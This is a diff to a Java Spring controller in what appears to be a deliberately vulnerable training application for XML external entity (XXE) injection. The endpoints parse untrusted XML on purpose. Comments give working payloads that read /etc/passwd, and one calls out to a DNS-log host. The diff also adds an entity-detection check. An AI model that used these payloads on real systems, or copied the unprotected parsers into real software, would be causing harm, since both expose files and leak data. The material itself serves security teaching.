@@ -1,10 +1,12 @@
 package com.best.hello.controller.XXE;
 
+import com.best.hello.util.Security;
+import io.swagger.annotations.Api;
+import io.swagger.annotations.ApiOperation;
+import lombok.extern.slf4j.Slf4j;
 import org.dom4j.io.SAXReader;
 import org.jdom2.input.SAXBuilder;
-import org.springframework.web.bind.annotation.RequestBody;
-import org.springframework.web.bind.annotation.RequestMapping;
-import org.springframework.web.bind.annotation.RestController;
+import org.springframework.web.bind.annotation.*;
 import org.w3c.dom.Document;
 import org.w3c.dom.Element;
 import org.w3c.dom.NodeList;
@@ -13,7 +15,6 @@ import org.xml.sax.XMLReader;
 import org.xml.sax.helpers.XMLReaderFactory;
 import org.xmlbeam.annotation.XBRead;
 
-import javax.xml.XMLConstants;
 import javax.xml.bind.JAXBContext;
 import javax.xml.bind.Unmarshaller;
 import javax.xml.parsers.DocumentBuilder;
@@ -22,21 +23,38 @@ import javax.xml.stream.XMLInputFactory;
 import javax.xml.stream.XMLStreamReader;
 import java.io.StringReader;
 
+/**
+ * 审计的函数
+ * 1. XMLReader
+ * 2. SAXReader
+ * 3. DocumentBuilder
+ * 4. XMLStreamReader
+ * 5. SAXBuilder
+ * 6. SAXParser
+ * 7. SAXSource
+ * 8. TransformerFactory
+ * 9. SAXTransformerFactory
+ * 10. SchemaFactory
+ * 11. Unmarshaller
+ * 12. XPathExpression
+ */
 
+@Api("Xml外部实体注入")
+@Slf4j
 @RestController
 @RequestMapping("/XXE")
 public class XXE {
 
     /**
-     * @vul XMLReader
      * @poc http://127.0.0.1:8888/XXE/XMLReader （POC）
      * Content-Type: application/xml
      * payload: <?xml version="1.0" encoding="utf-8"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "http://0g5zvd.dnslog.cn">]><root>&xxe;</root>
      */
-    @RequestMapping(value = "/XMLReader")
+    @ApiOperation(value = "vul：XMLReader")
+    @PostMapping(value = "/XMLReader")
     public String XMLReader(@RequestBody String content) {
         try {
-            System.out.println(content);
+            log.info("[vul] XMLReader: " + content);
 
             XMLReader xmlReader = XMLReaderFactory.createXMLReader();
             // 修复：禁用外部实体
@@ -48,16 +66,18 @@ public class XXE {
         }
     }
 
-    /**
-     * @vul xmlbeam
-     */
+
+    @ApiOperation(value = "vul：xmlbeam")
     @RequestMapping(value = "/xmlbeam")
     public String handleCustomer(@RequestBody Customer customer) {
-        System.out.println(customer);
+        log.info("[vul] xmlbeam: " + customer);
         return String.format("%s:%s login success!", customer.getFirstname(), customer.getLastname());
 
     }
 
+    /**
+     * 创建Customer接口
+     */
     public interface Customer {
         @XBRead("//username")
         String getFirstname();
@@ -67,10 +87,8 @@ public class XXE {
     }
 
 
-    /**
-     * @vul SAXReader
-     */
-    @RequestMapping(value = "/SAXReader")
+    @ApiOperation(value = "vul：SAXReader")
+    @PostMapping(value = "/SAXReader")
     public String SAXReader(@RequestBody String content) {
         try {
             SAXReader sax = new SAXReader();
@@ -84,9 +102,8 @@ public class XXE {
 
     }
 
-    /**
-     * @vul SAXBuilder，是一个JDOM解析器，能将路径中的XML文件解析为Document对象
-     */
+
+    @ApiOperation(value = "vul：SAXBuilder", notes = "是一个JDOM解析器，能将路径中的XML文件解析为Document对象")
     @RequestMapping(value = "/SAXBuilder")
     public String SAXBuilder(@RequestBody String content) {
         try {
@@ -101,10 +118,10 @@ public class XXE {
 
 
     /**
-     * @vul DocumentBuilder类 有回显
      * @poc http://127.0.0.1:8888/XXE/DocumentBuilder
      * payload: <?xml version="1.0" encoding="utf-8"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><person><name>&xxe;</name></person>
      */
+    @ApiOperation(value = "vul：DocumentBuilder类", notes = "带回显")
     @RequestMapping(value = "/DocumentBuilder")
     public String DocumentBuilder(@RequestBody String content) {
         try {
@@ -128,10 +145,10 @@ public class XXE {
 
 
     /**
-     * @vul Unmarshaller
      * @poc http://127.0.0.1:8888/XXE/unmarshaller (POST)
-     * payload <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE student[<!ENTITY out SYSTEM "file:///etc/passwd">]><student><name>&out;</name></student>
+     * body payload <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE student[<!ENTITY out SYSTEM "file:///etc/passwd">]><student><name>&out;</name></student>
      */
+    @ApiOperation(value = "vul：Unmarshaller")
     @RequestMapping(value = "/unmarshaller")
     public String Unmarshaller(@RequestBody String content) {
         try {
@@ -150,6 +167,8 @@ public class XXE {
             XMLStreamReader xsr = xif.createXMLStreamReader(new StringReader(content));
 
             Object o = unmarshaller.unmarshal(xsr);
+            log.info("[vul] Unmarshaller: " + content);
+
             return o.toString();
 
         } catch (Exception e) {
@@ -158,5 +177,15 @@ public class XXE {
         return "出错了！";
     }
 
+
+    @ApiOperation(value = "safe：检测是否包含ENTITY外部实体")
+    @RequestMapping(value = "/safe")
+    public String check(@RequestBody String content) {
+        if (!Security.checkXXE(content)) {
+            return "safe";
+        } else {
+            return "检测到XXE攻击";
+        }
+    }
 
 }
